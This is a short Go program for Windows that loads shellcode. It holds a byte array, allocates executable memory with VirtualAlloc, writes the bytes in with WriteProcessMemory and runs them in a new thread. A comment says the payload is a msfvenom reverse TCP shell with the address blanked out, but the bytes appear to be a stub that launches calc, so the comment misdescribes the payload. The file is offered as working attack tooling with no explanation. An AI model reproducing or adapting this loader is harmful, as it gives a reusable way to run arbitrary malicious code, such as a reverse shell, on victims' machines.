package main

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

// msfvenom -p windows/x64/shell_reverse_tcp xxxxx  xxxxx -f go
var shellcode = []byte{0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
	0xd7,
}
var (
	len_shellcode       = len(shellcode)
	kernel32            = windows.NewLazyDLL("kernel32")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	WriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	CreateThread        = kernel32.NewProc("CreateThread")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

const (
	MEM_COMMIT             = 0x00001000
	MEM_RESERVE            = 0x00002000
	PAGE_EXECUTE_READWRITE = 0x40
	INFINITE               = 0xFFFFFFFF
	HANDLE                 = 0xffffffffffffffff
)

func main() {

	alloc, _, err := VirtualAlloc.Call(0, uintptr(len_shellcode), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if err != windows.NTStatus(0).Errno() {
		panic(err)
	}

	_, _, err = WriteProcessMemory.Call(HANDLE, alloc, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len_shellcode), 0)
	if err != windows.NTStatus(0).Errno() {
		panic(err)
	}

	thread, _, err := CreateThread.Call(0, 0, alloc, 0, 0, 0)
	if err != windows.NTStatus(0).Errno() {
		panic(err)
	}
	_, _, err = WaitForSingleObject.Call(thread, INFINITE)
	if err != windows.NTStatus(0).Errno() {
		panic(err)
	}
}
